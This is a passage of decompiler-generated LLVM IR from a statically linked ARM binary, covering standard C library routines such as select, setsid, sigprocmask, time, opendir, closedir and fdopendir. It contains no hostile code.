  %v0_1304c = call i32 @__aeabi_read_tp()
  %v3_13050 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13050 = sext i16 %v3_13050 to i32
  %v0_13054 = load i32, i32* %r2.global-to-local, align 4
  %v1_13054 = sub i32 0, %v0_13054
  store i32 %v1_13054, i32* %r2.global-to-local, align 4
  %v3_13058 = add i32 %v4_13050, %v0_1304c
  %v4_13058 = inttoptr i32 %v3_13058 to i32*
  store i32 %v1_13054, i32* %v4_13058, align 4
  %v2_13060.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13060

dec_label_pc_13060:                               ; preds = %entry, %dec_label_pc_13048
  %v1_13064 = phi i32 [ %v0_13038, %entry ], [ -1, %dec_label_pc_13048 ]
  %v2_13060 = phi i32 [ %v3_13028, %entry ], [ %v2_13060.pre, %dec_label_pc_13048 ]
  store i32 %v2_13060, i32* @r4, align 4
  ret i32 %v1_13064

; uselistorder directives
  uselistorder i32 %v0_13038, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13060, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1306c = load i32, i32* @r4, align 4
  store i32 %v3_1306c, i32* %stack_var_-28, align 4
  %v6_1306c = load i32, i32* @r5, align 4
  %v9_1306c = load i32, i32* @r6, align 4
  %v12_1306c = load i32, i32* @r7, align 4
  %v15_1306c = load i32, i32* @r8, align 4
  %v18_1306c = load i32, i32* @sl, align 4
  %v21_1306c = load i32, i32* @lr, align 4
  %v4_1307c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 13000) to i32*), align 4
  %v2_13084 = icmp eq i32 %v4_1307c, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_13084, label %dec_label_pc_130a0, label %entry.dec_label_pc_130ac_crit_edge

entry.dec_label_pc_130ac_crit_edge:               ; preds = %entry
  br label %dec_label_pc_130ac

dec_label_pc_130a0:                               ; preds = %entry
  store i32 %v3_1306c, i32* @r4, align 4
  store i32 %v9_1306c, i32* @r6, align 4
  store i32 %v12_1306c, i32* @r7, align 4
  store i32 %v15_1306c, i32* @r8, align 4
  store i32 %v18_1306c, i32* %sl.global-to-local, align 4
  %v0_130a8 = call i32 @__syscall_select()
  br label %dec_label_pc_130ac

dec_label_pc_130ac:                               ; preds = %entry.dec_label_pc_130ac_crit_edge, %dec_label_pc_130a0
  %v0_130ac = call i32 @__libc_enable_asynccancel()
  store i32 %v0_130ac, i32* @r5, align 4
  %v0_130c0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_130c0, i32* @r0, align 4
  %v0_130c8 = call i32 @__syscall_select()
  store i32 %v0_130c8, i32* @r4, align 4
  %v0_130d0 = load i32, i32* @r5, align 4
  %v1_130d4 = call i32 @__libc_disable_asynccancel(i32 %v0_130d0)
  %v0_130d8 = load i32, i32* @r4, align 4
  %v2_130e0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_130e0, i32* @r4, align 4
  store i32 %v6_1306c, i32* @r5, align 4
  store i32 %v9_1306c, i32* @r6, align 4
  store i32 %v12_1306c, i32* @r7, align 4
  store i32 %v15_1306c, i32* @r8, align 4
  store i32 %v18_1306c, i32* @sl, align 4
  store i32 %v21_1306c, i32* @lr, align 4
  ret i32 %v0_130d8

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130ac, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_130f0 = load i32, i32* @r7, align 4
  store i32 %v3_130f0, i32* %stack_var_-8, align 4
  %v0_130fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_130fc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_130fc, -4095
  br i1 %tmp, label %dec_label_pc_13124, label %dec_label_pc_1310c

dec_label_pc_1310c:                               ; preds = %entry
  %v0_13110 = call i32 @__aeabi_read_tp()
  %v3_13114 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13114 = sext i16 %v3_13114 to i32
  %v0_13118 = load i32, i32* %r2.global-to-local, align 4
  %v1_13118 = sub i32 0, %v0_13118
  store i32 %v1_13118, i32* %r2.global-to-local, align 4
  %v3_1311c = add i32 %v4_13114, %v0_13110
  %v4_1311c = inttoptr i32 %v3_1311c to i32*
  store i32 %v1_13118, i32* %v4_1311c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13124.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13124

dec_label_pc_13124:                               ; preds = %entry, %dec_label_pc_1310c
  %v1_13128 = phi i32 [ %v0_130fc, %entry ], [ -1, %dec_label_pc_1310c ]
  %v2_13124 = phi i32 [ %v3_130f0, %entry ], [ %v2_13124.pre, %dec_label_pc_1310c ]
  store i32 %v2_13124, i32* @r7, align 4
  ret i32 %v1_13128

; uselistorder directives
  uselistorder i32 %v0_130fc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13124, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_13134 = icmp eq i32* %arg2, null
  br i1 %v2_13134, label %dec_label_pc_13178, label %dec_label_pc_13148

dec_label_pc_13148:                               ; preds = %entry
  %v2_13148 = load i32, i32* %arg2, align 4
  %v1_1314c = icmp slt i32 %v2_13148, 0
  br i1 %v1_1314c, label %dec_label_pc_13160, label %dec_label_pc_13154

dec_label_pc_13154:                               ; preds = %dec_label_pc_13148
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_13154 = load i32, i32* %.pre3, align 4
  %v1_13158 = urem i32 %v3_13154, 2
  %v2_13158 = icmp eq i32 %v1_13158, 0
  br i1 %v2_13158, label %dec_label_pc_13178, label %dec_label_pc_13160

dec_label_pc_13160:                               ; preds = %dec_label_pc_13148, %dec_label_pc_13154
  %v2_13160 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_13160 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_13178

dec_label_pc_13178:                               ; preds = %dec_label_pc_13154, %entry, %dec_label_pc_13160
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_131ac, label %dec_label_pc_13194

dec_label_pc_13194:                               ; preds = %dec_label_pc_13178
  %v1_13198 = sub i32 0, %arg1
  %v3_1319c = load i16, i16* @global_var_2447c.761, align 2
  %v4_1319c = sext i16 %v3_1319c to i32
  %v0_131a0 = call i32 @__aeabi_read_tp()
  %v3_131a4 = add i32 %v4_1319c, %v0_131a0
  %v4_131a4 = inttoptr i32 %v3_131a4 to i32*
  store i32 %v1_13198, i32* %v4_131a4, align 4
  br label %dec_label_pc_131ac

dec_label_pc_131ac:                               ; preds = %dec_label_pc_13178, %dec_label_pc_13194
  %v1_131b4 = phi i32 [ %arg1, %dec_label_pc_13178 ], [ -1, %dec_label_pc_13194 ]
  ret i32 %v1_131b4

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_131ac, { 1, 0 }
  uselistorder label %dec_label_pc_13178, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13160, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_131c0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_131d0 = call i32 @gettimeofday(i32 %v2_131c0, i32 0)
  %v2_131d4 = load i32, i32* %stack_var_-16, align 4
  %v2_131d8 = icmp eq i32* %arg1, null
  br i1 %v2_131d8, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_131d4, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_131d4

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_131ec = load i32, i32* @r4, align 4
  store i32 %v3_131ec, i32* %stack_var_-24, align 4
  %v9_131ec = load i32, i32* @r6, align 4
  %v12_131ec = load i32, i32* @r7, align 4
  %v15_131ec = load i32, i32* @r8, align 4
  %v18_131ec = load i32, i32* @lr, align 4
  %v2_131f0 = load i32, i32* %arg1, align 4
  store i32 %v2_131f0, i32* %r3.global-to-local, align 4
  %v3_131f8 = icmp eq i32 %v2_131f0, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r6, align 4
  br i1 %v3_131f8, label %dec_label_pc_1320c, label %dec_label_pc_13228

dec_label_pc_1320c:                               ; preds = %entry
  store i32 70240, i32* %r2.global-to-local, align 4
  %v0_13210 = call i32 @__aeabi_read_tp()
  %v3_13214 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13214 = sext i16 %v3_13214 to i32
  store i32 %v4_13214, i32* %r2.global-to-local, align 4
  %v0_13218 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_13218, i32* %r1.global-to-local, align 4
  %v1_1321c = add i32 %v0_13218, 10
  store i32 %v1_1321c, i32* %r3.global-to-local, align 4
  %v3_13220 = add i32 %v4_13214, %v0_13210
  %v4_13220 = inttoptr i32 %v3_13220 to i32*
  store i32 %v1_1321c, i32* %v4_13220, align 4
  %v0_132d0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_132d0

dec_label_pc_13228:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_1322c = add i32 %tmp, 24
  store i32 %v1_1322c, i32* %r2.global-to-local, align 4
  %v4_13234 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 68) to i32*), align 4
  store i32 %v4_13234, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13240 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13240)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_13258 = load i32, i32* @r6, align 4
  %v2_13258 = add i32 %v0_13258, 16
  %v3_13258 = inttoptr i32 %v2_13258 to i32*
  %v4_13258 = load i32, i32* %v3_13258, align 4
  call void @__pseudo_branch(i32 %v4_13258)
  %v0_13264 = load i32, i32* @r7, align 4
  %v1_13264 = inttoptr i32 %v0_13264 to i32*
  %v2_13264 = load i32, i32* %v1_13264, align 4
  store i32 %v2_13264, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_13274 = load i32, i32* @r8, align 4
  store i32 %v0_13274, i32* %v1_13264, align 4
  %v0_13278 = load i32, i32* @r6, align 4
  %v1_13278 = load i32, i32* %r3.global-to-local, align 4
  %v2_13278 = add i32 %v1_13278, %v0_13278
  %v3_13278 = inttoptr i32 %v2_13278 to i32*
  %v4_13278 = load i32, i32* %v3_13278, align 4
  store i32 ptrtoint (i32* @global_var_13284.788 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13278)
  %v0_13284 = load i32, i32* @r7, align 4
  %v1_13284 = add i32 %v0_13284, 12
  %v2_13284 = inttoptr i32 %v1_13284 to i32*
  %v3_13284 = load i32, i32* %v2_13284, align 4
  store i32 %v3_13284, i32* @r0, align 4
  %v0_13288 = call i32 @free()
  %v0_1328c = load i32, i32* @r7, align 4
  store i32 %v0_1328c, i32* @r0, align 4
  %v0_13290 = call i32 @free()
  %v0_13298 = load i32, i32* @r4, align 4
  store i32 %v0_13298, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_13298, -4095
  br i1 %tmp11, label %dec_label_pc_132cc, label %dec_label_pc_132b4

dec_label_pc_132b4:                               ; preds = %dec_label_pc_13228
  store i32 70072, i32* %r3.global-to-local, align 4
  %v0_132b8 = call i32 @__aeabi_read_tp()
  %v3_132bc = load i16, i16* @global_var_2447c.761, align 2
  %v4_132bc = sext i16 %v3_132bc to i32
  store i32 %v4_132bc, i32* %r3.global-to-local, align 4
  %v0_132c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_132c0 = sub i32 0, %v0_132c0
  store i32 %v1_132c0, i32* %r2.global-to-local, align 4
  %v3_132c4 = add i32 %v4_132bc, %v0_132b8
  %v4_132c4 = inttoptr i32 %v3_132c4 to i32*
  store i32 %v1_132c0, i32* %v4_132c4, align 4
  %v0_132c8 = load i32, i32* @r8, align 4
  br label %dec_label_pc_132cc

dec_label_pc_132cc:                               ; preds = %dec_label_pc_13228, %dec_label_pc_132b4
  %v0_132cc = phi i32 [ %v0_13298, %dec_label_pc_13228 ], [ %v0_132c8, %dec_label_pc_132b4 ]
  store i32 %v0_132cc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_132d0

dec_label_pc_132d0:                               ; preds = %dec_label_pc_1320c, %dec_label_pc_132cc
  %v0_132d0 = phi i32 [ %v0_132d0.pre, %dec_label_pc_1320c ], [ %v0_132cc, %dec_label_pc_132cc ]
  %v2_132d8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_132d8, i32* @r4, align 4
  store i32 %v9_131ec, i32* @r6, align 4
  store i32 %v12_131ec, i32* @r7, align 4
  store i32 %v15_131ec, i32* @r8, align 4
  store i32 %v18_131ec, i32* @lr, align 4
  ret i32 %v0_132d0

; uselistorder directives
  uselistorder i32 %v0_13298, { 1, 0, 2 }
  uselistorder label %dec_label_pc_132d0, { 1, 0 }
  uselistorder label %dec_label_pc_132cc, { 1, 0 }
}

define i32 @function_132e8(i32 %arg1, i16* %arg2) local_unnamed_addr {
dec_label_pc_132e8:
  %v0_132e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_132e8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_132e8
  %tmp = ptrtoint i16* %arg2 to i32
  %v3_132f8 = trunc i32 %tmp to i16
  store i16 %v3_132f8, i16* %arg2, align 2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_132e8, %bb
  %v11_132f8 = phi i32 [ %arg1, %dec_label_pc_132e8 ], [ 0, %bb ]
  ret i32 %v11_132f8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_132fc = load i32, i32* @r4, align 4
  %v6_132fc = load i32, i32* @r5, align 4
  %v9_132fc = load i32, i32* @r6, align 4
  %v12_132fc = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_13310 = call i32 @malloc()
  %v2_13318 = icmp eq i32 %v0_13310, 0
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r6, align 4
  br i1 %v2_13318, label %bb, label %dec_label_pc_13328

bb:                                               ; preds = %entry
  br label %dec_label_pc_133b4

dec_label_pc_13328:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1332c = load i32, i32* @r4, align 4
  %v2_1332c = icmp ugt i32 %v0_1332c, 511
  %v2_13330 = add i32 %v0_13310, 4
  %v3_13330 = inttoptr i32 %v2_13330 to i32*
  store i32 0, i32* %v3_13330, align 4
  %v0_13334 = load i32, i32* %r3.global-to-local, align 4
  %v2_13334 = add i32 %v0_13310, 16
  %v3_13334 = inttoptr i32 %v2_13334 to i32*
  store i32 %v0_13334, i32* %v3_13334, align 4
  %v0_13338 = load i32, i32* %r3.global-to-local, align 4
  %v2_13338 = add i32 %v0_13310, 8
  %v3_13338 = inttoptr i32 %v2_13338 to i32*
  store i32 %v0_13338, i32* %v3_13338, align 4
  br i1 %v2_1332c, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_13328
  %v0_133402 = load i32, i32* @r4, align 4
  %v2_133403 = add i32 %v0_13310, 20
  %v3_133404 = inttoptr i32 %v2_133403 to i32*
  store i32 %v0_133402, i32* %v3_133404, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_13328
  %v1_1333c = load i32, i32* %r3.global-to-local, align 4
  %v2_1333c = add i32 %v1_1333c, 512
  store i32 %v2_1333c, i32* %r3.global-to-local, align 4
  %v0_13340 = load i32, i32* @r4, align 4
  %v2_13340 = add i32 %v0_13310, 20
  %v3_13340 = inttoptr i32 %v2_13340 to i32*
  store i32 %v0_13340, i32* %v3_13340, align 4
  %v1_13344 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_13344, i32* %v3_13340, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_13310, i32* @r5, align 4
  %v0_1334c = load i32, i32* @r7, align 4
  %v2_1334c = inttoptr i32 %v0_13310 to i32*
  store i32 %v0_1334c, i32* %v2_1334c, align 4
  %v0_13350 = load i32, i32* @r5, align 4
  %v1_13350 = add i32 %v0_13350, 20
  %v2_13350 = inttoptr i32 %v1_13350 to i32*
  %v3_13350 = load i32, i32* %v2_13350, align 4
  store i32 %v3_13350, i32* %r1.global-to-local, align 4
  %v2_13358 = call i32 @calloc(i32 1, i32 %v3_13350)
  %v2_1335c = icmp eq i32 %v2_13358, 0
  store i32 %v2_13358, i32* @r4, align 4
  %v1_13364 = load i32, i32* @r5, align 4
  %v2_13364 = add i32 %v1_13364, 12
  %v3_13364 = inttoptr i32 %v2_13364 to i32*
  store i32 %v2_13358, i32* %v3_13364, align 4
  br i1 %v2_1335c, label %dec_label_pc_1336c, label %dec_label_pc_1337c

dec_label_pc_1336c:                               ; preds = %bb17
  %v0_1336c = load i32, i32* @r5, align 4
  store i32 %v0_1336c, i32* @r0, align 4
  %v0_13370 = call i32 @free()
  %v0_13374 = load i32, i32* @r4, align 4
  br label %dec_label_pc_133b4

dec_label_pc_1337c:                               ; preds = %bb17
  %v0_13380 = load i32, i32* @r6, align 4
  %v2_13380 = add i32 %v0_13380, -34032
  store i32 %v2_13380, i32* %r3.global-to-local, align 4
  %v1_13388 = inttoptr i32 %v2_13380 to i32*
  %v2_13388 = load i32, i32* %v1_13388, align 4
  %v3_13388 = add i32 %v0_13380, -34028
  %v4_13388 = inttoptr i32 %v3_13388 to i32*
  %v5_13388 = load i32, i32* %v4_13388, align 4
  store i32 %v5_13388, i32* %r1.global-to-local, align 4
  %v6_13388 = add i32 %v0_13380, -34024
  %v7_13388 = inttoptr i32 %v6_13388 to i32*
  %v8_13388 = load i32, i32* %v7_13388, align 4
  store i32 %v8_13388, i32* %r2.global-to-local, align 4
  %v9_13388 = add i32 %v0_13380, -34020
  %v10_13388 = inttoptr i32 %v9_13388 to i32*
  %v11_13388 = load i32, i32* %v10_13388, align 4
  store i32 %v11_13388, i32* %r3.global-to-local, align 4
  %v12_13388 = add i32 %v0_13380, -34016
  %v1_13394 = inttoptr i32 %v12_13388 to i32*
  %v2_13394 = load i32, i32* %v1_13394, align 4
  %v3_13394 = add i32 %v0_13380, -34012
  %v4_13394 = inttoptr i32 %v3_13394 to i32*
  %v5_13394 = load i32, i32* %v4_13394, align 4
  store i32 %v2_13394, i32* %stack_var_-32, align 4
  store i32 %v5_13388, i32* %r1.global-to-local, align 4
  store i32 %v8_13388, i32* %r2.global-to-local, align 4
  store i32 %v11_13388, i32* %r3.global-to-local, align 4
  %v0_133a4 = load i32, i32* @r5, align 4
  %v1_133a4 = add i32 %v0_133a4, 24
  %v1_133a8 = inttoptr i32 %v1_133a4 to i32*
  store i32 %v2_13388, i32* %v1_133a8, align 4
  %v3_133a8 = add i32 %v0_133a4, 28
  %v4_133a8 = inttoptr i32 %v3_133a8 to i32*
  %v5_133a8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_133a8, i32* %v4_133a8, align 4
  %v6_133a8 = add i32 %v0_133a4, 32
  %v7_133a8 = inttoptr i32 %v6_133a8 to i32*
  %v8_133a8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_133a8, i32* %v7_133a8, align 4
  %v9_133a8 = add i32 %v0_133a4, 36
  %v10_133a8 = inttoptr i32 %v9_133a8 to i32*
  %v11_133a8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_133a8, i32* %v10_133a8, align 4
  %v12_133a8 = add i32 %v0_133a4, 40
  %v2_133ac = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_13394, i32* %r1.global-to-local, align 4
  %v1_133b0 = inttoptr i32 %v12_133a8 to i32*
  store i32 %v2_133ac, i32* %v1_133b0, align 4
  %v3_133b0 = add i32 %v0_133a4, 44
  %v4_133b0 = inttoptr i32 %v3_133b0 to i32*
  %v5_133b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_133b0, i32* %v4_133b0, align 4
  %v0_133b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_133b4

dec_label_pc_133b4:                               ; preds = %bb, %dec_label_pc_1336c, %dec_label_pc_1337c
  %v0_133b4 = phi i32 [ 0, %bb ], [ %v0_13374, %dec_label_pc_1336c ], [ %v0_133b4.pre, %dec_label_pc_1337c ]
  store i32 %v3_132fc, i32* @r4, align 4
  store i32 %v6_132fc, i32* @r5, align 4
  store i32 %v9_132fc, i32* @r6, align 4
  store i32 %v12_132fc, i32* @r7, align 4
  ret i32 %v0_133b4

; uselistorder directives
  uselistorder i32 %v2_13358, { 1, 0, 2 }
  uselistorder i32 %v0_13310, { 2, 1, 6, 0, 4, 3, 5, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 11, 10, 1, 6, 2, 7, 12, 8, 13, 9, 14, 3, 15, 4, 16, 0, 17, 5, 18 }
  uselistorder label %dec_label_pc_133b4, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_133cc = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_133d4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_13404, label %dec_label_pc_133ec

dec_label_pc_133ec:                               ; preds = %entry
  %v0_133f0 = call i32 @__aeabi_read_tp()
  %v3_133f4 = load i16, i16* @global_var_2447c.761, align 2
  %v4_133f4 = sext i16 %v3_133f4 to i32
  %v0_133f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_133f8 = sub i32 0, %v0_133f8
  store i32 %v1_133f8, i32* %r2.global-to-local, align 4
  %v3_133fc = add i32 %v4_133f4, %v0_133f0
  %v4_133fc = inttoptr i32 %v3_133fc to i32*
  store i32 %v1_133f8, i32* %v4_133fc, align 4
  br label %dec_label_pc_13428

dec_label_pc_13404:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_13404 = icmp slt i32 %arg1, 0
  br i1 %v1_13404, label %dec_label_pc_13428, label %dec_label_pc_1340c

dec_label_pc_1340c:                               ; preds = %dec_label_pc_13404
  store i32 %v2_133d4, i32* @r1, align 4
  %v0_13410 = call i32 @fstat()
  %v1_13414 = icmp slt i32 %v0_13410, 0
  br i1 %v1_13414, label %dec_label_pc_1341c, label %dec_label_pc_13430

dec_label_pc_1341c:                               ; preds = %dec_label_pc_1340c
  br label %dec_label_pc_13428

dec_label_pc_13428:                               ; preds = %dec_label_pc_1341c, %dec_label_pc_13404, %dec_label_pc_133ec
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13474

dec_label_pc_13430:                               ; preds = %dec_label_pc_1340c
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_13438 = load i32, i32* @r7, align 4
  %v3_1343c = call i32 @__GI___fcntl_nocancel(i32 %v0_13438, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_13444 = load i32, i32* @r7, align 4
  %v2_13448 = call i32 @fd_to_DIR(i32 %v0_13444, i32 %tmp)
  store i32 %v2_13448, i32* %r1.global-to-local, align 4
  %v2_1344c = icmp eq i32 %v2_13448, 0
  br i1 %v2_1344c, label %dec_label_pc_13454, label %dec_label_pc_13474

dec_label_pc_13454:                               ; preds = %dec_label_pc_13430
  %v0_13464 = call i32 @__aeabi_read_tp()
  %v3_13468 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13468 = sext i16 %v3_13468 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_13470 = add i32 %v4_13468, %v0_13464
  %v4_13470 = inttoptr i32 %v3_13470 to i32*
  store i32 12, i32* %v4_13470, align 4
  %v0_13474.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13474

dec_label_pc_13474:                               ; preds = %dec_label_pc_13430, %dec_label_pc_13428, %dec_label_pc_13454
  %v0_13474 = phi i32 [ %v2_13448, %dec_label_pc_13430 ], [ 0, %dec_label_pc_13428 ], [ %v0_13474.pre, %dec_label_pc_13454 ]
  store i32 %v3_133cc, i32* @r7, align 4
  ret i32 %v0_13474

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_13474, { 2, 0, 1 }
}

define i32 @"$d.11"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13484:
  %v0_13484 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13484, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13484
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13484, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_13494 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_13494, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_134a0 = call i32 @fstat()
  store i32 %v0_134a0, i32* @r5, align 4
  %v2_134a4 = icmp eq i32 %v0_134a0, 0
  br i1 %v2_134a4, label %dec_label_pc_134ac, label %dec_label_pc_13524

dec_label_pc_134ac:                               ; preds = %entry
  %v1_134b0 = and i32 %tmp4, 61440
  store i32 %v1_134b0, i32* @r3, align 4
  %v7_134b4 = icmp eq i32 %v1_134b0, 16384
  br i1 %v7_134b4, label %dec_label_pc_134d4, label %dec_label_pc_134bc

dec_label_pc_134bc:                               ; preds = %dec_label_pc_134ac
  %v0_134c0 = call i32 @__aeabi_read_tp()
  %v3_134c4 = load i16, i16* @global_var_2447c.761, align 2
  %v0_134c8 = load i32, i32* @r5, align 4
  store i32 %v0_134c8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13508

dec_label_pc_134d4:                               ; preds = %dec_label_pc_134ac
  %v0_134d4 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_134dc = call i32 @__libc_fcntl(i32 %v0_134d4, i32 3)
  %v7_134e0 = icmp eq i32 %v2_134dc, -1
  br i1 %v7_134e0, label %dec_label_pc_13524, label %dec_label_pc_134e8

dec_label_pc_134e8:                               ; preds = %dec_label_pc_134d4
  %v1_134e8 = urem i32 %v2_134dc, 4
  store i32 %v1_134e8, i32* %r3.global-to-local, align 4
  %v7_134ec = icmp eq i32 %v1_134e8, 1
  br i1 %v7_134ec, label %dec_label_pc_134f4, label %dec_label_pc_13510

dec_label_pc_134f4:                               ; preds = %dec_label_pc_134e8
  %v0_134f8 = call i32 @__aeabi_read_tp()
  %v3_134fc = load i16, i16* @global_var_2447c.761, align 2
  %v0_13500 = load i32, i32* @r5, align 4
  store i32 %v0_13500, i32* %r1.global-to-local, align 4
  %v0_13504 = load i32, i32* %r3.global-to-local, align 4
  %v1_13504 = add i32 %v0_13504, 21
  br label %dec_label_pc_13508

